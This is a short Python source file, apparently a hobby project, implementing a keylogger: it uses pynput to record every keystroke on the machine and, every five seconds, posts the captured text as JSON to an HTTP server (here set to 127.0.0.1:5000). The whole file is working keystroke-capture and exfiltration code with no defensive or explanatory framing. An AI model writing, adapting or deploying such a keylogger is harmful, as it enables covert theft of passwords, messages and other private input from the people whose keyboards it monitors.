from pynput.keyboard import Listener,Key
import requests
from threading import Timer
import json


keys=""
interval=5

unwantedKeys=['Key.ctrl','Key.ctrl_l','Key.ctrl_r','Key.alt','Key.alt_l','Key.alt_r','Key.caps_lock','Key.shift','Key.shift_l','Key.shift_r']
def click(key):
    global keys
    if key==Key.space:
        keys+=" "
    elif key==Key.enter:
        keys+="\n" 
    elif key==Key.backspace:
        keys+=" BACKSPACE "
    else:
        keys+=str(key).strip("'")
    
    
def release(key):
    if key==Key.esc:
        return False

def sendKeys():
    global keys
    try:
        print(keys,type(keys),type(unwantedKeys[0]))

        if keys in unwantedKeys:
            print("yes")
            keys=""   
        data=json.dumps({"keys":keys})
        keys="" 
        r=requests.post("http://127.0.0.1:5000",data=data,headers={"Content-Type" : "application/json"})
        print(r.text)
        timer=Timer(interval,sendKeys)
        timer.start()       
    except:
        print("Couldn't establish a connection")


with Listener(on_press=click,on_release=release) as listner:
    sendKeys()
    listner.join()
    



